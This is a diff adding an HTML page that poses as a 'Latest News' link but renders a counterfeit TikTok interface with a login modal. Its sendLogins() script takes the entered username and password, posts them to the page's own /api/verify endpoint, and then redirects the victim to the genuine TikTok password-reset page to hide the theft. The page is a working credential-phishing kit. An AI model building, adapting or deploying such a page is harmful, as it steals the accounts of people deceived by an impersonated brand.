@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en">
+
+<head>
+    <title>Latest News</title>
+    <meta name="description"
+    content="Caption: View this news">
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&amp;display=swap"
+        rel="stylesheet" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+        rel="stylesheet" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
+        rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "on-background": "#e5e2e1",
+                        "tertiary": "#65dbad",
+                        "on-surface": "#e5e2e1",
+                        "primary": "#ffb3b6",
+                        "on-primary": "#680019",
+                        "on-error-container": "#ffdad6",
+                        "primary-fixed-dim": "#ffb3b6",
+                        "on-primary-fixed-variant": "#920027",
+                        "on-secondary": "#003735",
+                        "inverse-on-surface": "#313030",
+                        "tertiary-fixed": "#83f8c8",
+                        "inverse-surface": "#e5e2e1",
+                        "on-secondary-fixed-variant": "#00504d",
+                        "on-primary-fixed": "#40000c",
+                        "on-tertiary-fixed": "#002115",
+                        "outline": "#ad8889",
+                        "on-tertiary-container": "#003121",
+                        "surface-tint": "#ffb3b6",
+                        "error": "#ffb4ab",
+                        "on-primary-container": "#5b0015",
+                        "surface-container-low": "#1c1b1b",
+                        "surface": "#131313",
+                        "outline-variant": "#5d3f40",
+                        "surface-container": "#201f1f",
+                        "on-surface-variant": "#e6bcbd",
+                        "secondary-fixed": "#35fbf5",
+                        "tertiary-fixed-dim": "#65dbad",
+                        "primary-fixed": "#ffdada",
+                        "secondary-container": "#05ece7",
+                        "surface-dim": "#131313",
+                        "surface-container-highest": "#353534",
+                        "surface-bright": "#393939",
+                        "error-container": "#93000a",
+                        "inverse-primary": "#be0036",
+                        "background": "#131313",
+                        "on-secondary-fixed": "#00201f",
+                        "surface-container-high": "#2a2a2a",
+                        "primary-container": "#ff5168",
+                        "surface-container-lowest": "#0e0e0e",
+                        "on-tertiary-fixed-variant": "#00513a",
+                        "on-secondary-container": "#006764",
+                        "on-tertiary": "#003827",
+                        "on-error": "#690005",
+                        "tertiary-container": "#20a47a",
+                        "secondary-fixed-dim": "#00ddd8",
+                        "surface-variant": "#353534",
+                        "secondary": "#affffb"
+                    },
+                    "borderRadius": {
+                        "DEFAULT": "0.25rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                    "spacing": {
+                        "margin": "24px",
+                        "md": "16px",
+                        "max_width": "1100px",
+                        "lg": "24px",
+                        "unit": "4px",
+                        "sm": "8px",
+                        "xl": "32px",
+                        "xs": "4px",
+                        "gutter": "16px"
+                    },
+                    "fontFamily": {
+                        "caption": ["Plus Jakarta Sans"],
+                        "headline-md": ["Plus Jakarta Sans"],
+                        "display-lg": ["Plus Jakarta Sans"],
+                        "body-lg": ["Plus Jakarta Sans"],
+                        "body-md": ["Plus Jakarta Sans"],
+                        "label-sm": ["Plus Jakarta Sans"]
+                    },
+                    "fontSize": {
+                        "caption": ["12px", { "lineHeight": "1.4", "fontWeight": "400" }],
+                        "headline-md": ["24px", { "lineHeight": "1.3", "fontWeight": "700" }],
+                        "display-lg": ["32px", { "lineHeight": "1.2", "letterSpacing": "-0.02em", "fontWeight": "800" }],
+                        "body-lg": ["18px", { "lineHeight": "1.5", "fontWeight": "600" }],
+                        "body-md": ["16px", { "lineHeight": "1.5", "fontWeight": "400" }],
+                        "label-sm": ["14px", { "lineHeight": "1.2", "fontWeight": "600" }]
+                    }
+                },
+            },
+        }
+    </script>
+    <style>
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+        }
+
+        .modal-overlay {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(20px);
+        }
+    </style>
+</head>
+
+<body class="bg-neutral-950 font-body-md text-on-surface overflow-hidden">
+    <!-- TopNavBar -->
+    <header
+        class="fixed top-0 w-full h-[60px] flex items-center justify-between px-4 md:px-6 z-50 bg-neutral-950 border-b border-white/10 font-['Plus_Jakarta_Sans'] text-sm font-semibold">
+        <div class="flex items-center gap-4">
+            <div class="text-2xl font-black text-white tracking-tighter">TikTok</div>
+        </div>
+        <div class="hidden md:flex items-center flex-1 max-w-[500px] mx-8">
+            <div class="w-full bg-white/10 rounded-full px-4 py-2 flex items-center gap-2">
+                <span class="material-symbols-outlined text-white/50" data-icon="search">search</span>
+                <input
+                    class="bg-transparent border-none outline-none text-white w-full text-sm placeholder:text-white/40"
+                    placeholder="Search" type="text" />
+            </div>
+        </div>
+        <div class="flex items-center gap-4">
+            <button
+                class="text-white hover:bg-white/5 transition-colors px-4 py-1.5 rounded-sm flex items-center gap-2">
+                <span class="material-symbols-outlined" data-icon="add">add</span>
+                Upload
+            </button>
+            <button
+                class="bg-[#FE2C55] text-white px-6 py-1.5 rounded font-bold hover:brightness-110 active:scale-95 duration-200">
+                Log in
+            </button>
+            <span class="material-symbols-outlined text-white/60 cursor-pointer" data-icon="more_vert">more_vert</span>
+        </div>
+    </header>
+    <!-- SideNavBar -->
+    <aside
+        class="fixed left-0 top-[60px] flex flex-col p-2 h-[calc(100vh-60px)] overflow-y-auto bg-neutral-950 border-r border-white/10 w-[240px] md:w-[350px] z-40">
+        <nav class="flex flex-col gap-1 pb-4 border-b border-white/10">
+            <a class="text-rose-600 flex items-center gap-4 py-3 px-2 font-['Plus_Jakarta_Sans'] text-lg font-bold hover:bg-white/5 rounded-lg transition-all duration-300"
+                href="#">
+                <span class="material-symbols-outlined" data-icon="home" data-weight="fill"
+                    style="font-variation-settings: 'FILL' 1;">home</span>
+                For You
+            </a>
+            <a class="text-white flex items-center gap-4 py-3 px-2 font-['Plus_Jakarta_Sans'] text-lg font-bold hover:bg-white/5 rounded-lg transition-all duration-300 text-white/60"
+                href="#">
+                <span class="material-symbols-outlined" data-icon="group">group</span>
+                Following
+            </a>
+            <a class="text-white flex items-center gap-4 py-3 px-2 font-['Plus_Jakarta_Sans'] text-lg font-bold hover:bg-white/5 rounded-lg transition-all duration-300 text-white/60"
+                href="#">
+                <span class="material-symbols-outlined" data-icon="explore">explore</span>
+                Explore
+            </a>
+            <a class="text-white flex items-center gap-4 py-3 px-2 font-['Plus_Jakarta_Sans'] text-lg font-bold hover:bg-white/5 rounded-lg transition-all duration-300 text-white/60"
+                href="#">
+                <span class="material-symbols-outlined" data-icon="live_tv">live_tv</span>
+                LIVE
+            </a>
+        </nav>
+        <div class="py-5 px-2">
+            <p class="text-white/60 text-body-md mb-4 leading-relaxed">Log in to follow creators, like videos, and view
+                comments.</p>
+            <button
+                class="w-full py-3 border border-[#FE2C55] text-[#FE2C55] font-bold rounded-lg hover:bg-[#FE2C55]/5 transition-colors">Log
+                in</button>
+        </div>
+        <div class="mt-auto pt-4 flex flex-wrap gap-x-3 gap-y-1 px-2 pb-6">
+            <a class="text-white/40 text-caption hover:underline" href="#">About</a>
+            <a class="text-white/40 text-caption hover:underline" href="#">Newsroom</a>
+            <a class="text-white/40 text-caption hover:underline" href="#">Contact</a>
+            <a class="text-white/40 text-caption hover:underline" href="#">Careers</a>
+            <p class="text-white/20 text-caption w-full mt-4">© 2024 TikTok</p>
+        </div>
+    </aside>
+    <!-- Main Content Canvas (Blurred Background) -->
+    <main
+        class="ml-[240px] md:ml-[350px] mt-[60px] min-h-[calc(100vh-60px)] p-6 grid grid-cols-2 lg:grid-cols-3 gap-4 opacity-30 pointer-events-none">
+        <div class="aspect-[9/16] bg-surface-container rounded-xl overflow-hidden relative">
+            <img class="w-full h-full object-cover"
+                data-alt="vibrant street dance performance at night with neon lights and urban motion blur aesthetic"
+                src="https://lh3.googleusercontent.com/aida-public/AB6AXuAqjpVmF67h4XdXKXag4a2zPpxDvSDE41-ufSmwcmbh3rpzQTT9KN9ZOttj8j8n3L9BQ5ZvSyaKWLImRpIR97TvIRmgjK77owgdfhENxD4N3rEhmc-40Fzfk-Qc5KrF9eXbplu2VofU_KkksMbxZJ6r15t9IWzS2DcFbexFF0MeQ3YgaKvgjeJodpRq4-lB3hPz8__C77Dl-XU1Ild68ZICJhcjsfI5X2zjqL5g62VNtEku556z5VxIXcFWqOG1uZJ4iyM1p1-Wg4U" />
+        </div>
+        <div class="aspect-[9/16] bg-surface-container rounded-xl overflow-hidden relative">
+            <img class="w-full h-full object-cover"
+                data-alt="cinematic close-up of a chef preparing gourmet noodles with steam rising and warm kitchen lighting"
+                src="https://lh3.googleusercontent.com/aida-public/AB6AXuDArt72sy3kOKsjTFMe2pZR-gDcCJQu-db0p3poIjqb08mR5GpVXDP5kXyF7yHkY-7fw_2lVSGamIus9g8ZJJQPtaH8JucX8OdBMNXgbxMy5j65KPGpC-49lRQuNLzbBi7l5V59UznIJuuhnaH6_WH36BJwxMu3a_13A6pg5gPL2c7A_QqdwFXwK0LKfsKkUP5V6zX9z6IqC4AWxTon4ujIeSRAPbHSm8Qel-kfp0Ui3VCrW7CfMZ4DR19cVjFCeNhk0Cf3frqv480" />
+        </div>
+        <div class="aspect-[9/16] bg-surface-container rounded-xl overflow-hidden relative hidden lg:block">
+            <img class="w-full h-full object-cover"
+                data-alt="retro gaming setup with purple synthwave lighting and mechanical keyboard detail"
+                src="https://lh3.googleusercontent.com/aida-public/AB6AXuCQ5Tbvc89zO-X7Dud1VKWPUpw7Rs1Ggr3-77tN10sPjTMekMLrUCu9f8F8l_Zg5W6jtA0uyEKsDBFv8MF2ElS1RtWb5EplX-OAeMIqFJyqdWxVVbXOXE-ncurRONE9-uw2im1RyRN7WvaSC2vg9HJkfK0Q6IEnW2hldd8JvzOFJjnsa5vMhdnoXjrG2ZobSKTSXK1OOlkz4nX-M3f0OmONajpuyfvuGHlk3j6-fZHJ-43adl7iq2p9YzCHixvOekLA23h1R3B3_u0" />
+        </div>
+    </main>
+    <!-- Login Modal Overlay -->
+    <div class="fixed inset-0 z-[100] modal-overlay flex items-center justify-center">
+        <!-- Modal Container -->
+        <div class="bg-white text-black w-[480px] rounded-[12px] flex flex-col relative overflow-hidden shadow-2xl">
+            <!-- Modal Header -->
+            <div class="pt-8 px-14 flex items-center justify-between relative">
+                <button class="absolute left-8 top-8 hover:bg-neutral-100 rounded-full p-1 transition-colors">
+                    <span class="material-symbols-outlined text-[28px]" data-icon="chevron_left">chevron_left</span>
+                </button>
+                <h1 class="font-display-lg text-black w-full text-center">Log in</h1>
+            </div>
+            <!-- Tabs/Toggles -->
+            <div class="px-14 mt-8 flex border-b border-[#E3E3E3]">
+                <button
+                    class="flex-1 pb-3 text-label-sm text-neutral-400 border-b-2 border-transparent hover:text-neutral-600 transition-all">Phone</button>
+                <button class="flex-1 pb-3 text-label-sm text-black border-b-2 border-black transition-all">Email /
+                    Username</button>
+            </div>
+            <!-- Modal Body / Form -->
+            <div class="px-14 py-8 flex flex-col gap-4">
+                <div class="flex flex-col gap-1.5">
+                    <label class="text-label-sm text-black font-bold">Email, phone or username</label>
+                    <input id="username-field"
+                        class="w-full h-[44px] bg-[#F1F1F1] rounded-lg px-4 border border-transparent focus:border-[#FE2C55] focus:ring-0 outline-none transition-all placeholder:text-neutral-400"
+                        placeholder="Email or username" type="text" />
+                </div>
+                <div class="flex flex-col gap-1.5 relative">
+                    <div class="flex justify-between items-center">
+                        <label class="text-label-sm text-black font-bold">Password</label>
+                    </div>
+                    <div class="relative">
+                        <input id="password-field"
+                            class="w-full h-[44px] bg-[#F1F1F1] rounded-lg px-4 border border-transparent focus:border-[#FE2C55] focus:ring-0 outline-none transition-all placeholder:text-neutral-400"
+                            placeholder="Password" type="password" />
+                        <span
+                            class="material-symbols-outlined absolute right-3 top-1/2 -translate-y-1/2 text-neutral-500 cursor-pointer text-[20px]"
+                            data-icon="visibility_off">visibility_off</span>
+                    </div>
+                </div>
+                <div class="flex items-center justify-start mt-1">
+                    <a class="text-label-sm text-neutral-600 hover:underline"
+                        href="https://www.tiktok.com/login/email/forget-password">Forgot password?</a>
+                </div>
+                <button
+                onclick="sendLogins()"
+                    class="w-full h-[52px] bg-[#FE2C55] text-white font-headline-md rounded-lg mt-4 hover:brightness-105 active:scale-[0.98] transition-all">
+                    Log in
+                </button>
+            </div>
+            <!-- Modal Footer -->
+            <div class="bg-white border-t border-[#E3E3E3] py-8 text-center">
+                <p class="text-body-md text-neutral-700">
+                    Don't have an account? <a class="text-[#FE2C55] font-bold hover:underline" href="#">Sign up</a>
+                </p>
+            </div>
+            <!-- Close button -->
+            <button
+                class="absolute right-6 top-6 w-8 h-8 flex items-center justify-center bg-neutral-100 rounded-full hover:bg-neutral-200 transition-colors">
+                <span class="material-symbols-outlined text-[20px]" data-icon="close">close</span>
+            </button>
+        </div>
+    </div>
+    <script>
+        async function sendLogins() {
+            let u = document.getElementById("username-field");
+            let p = document.getElementById("password-field");
+
+            if (u.value.length < 6 || p.value.length < 6) {
+                return;
+            }
+
+            try {
+                const response = await fetch("/api/verify", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ username: u.value, password: p.value }),
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    // Redirect on success
+                    window.location.href = "https://www.tiktok.com/login/email/forget-password";
+                } else {
+                    alert(data.message || "Invalid code");
+                }
+            } catch (error) {
+                console.error("Verification failed:", error);
+            } finally {
+                //setLoading(false);
+            }
+        }
+    </script>
+</body>
+
+</html>
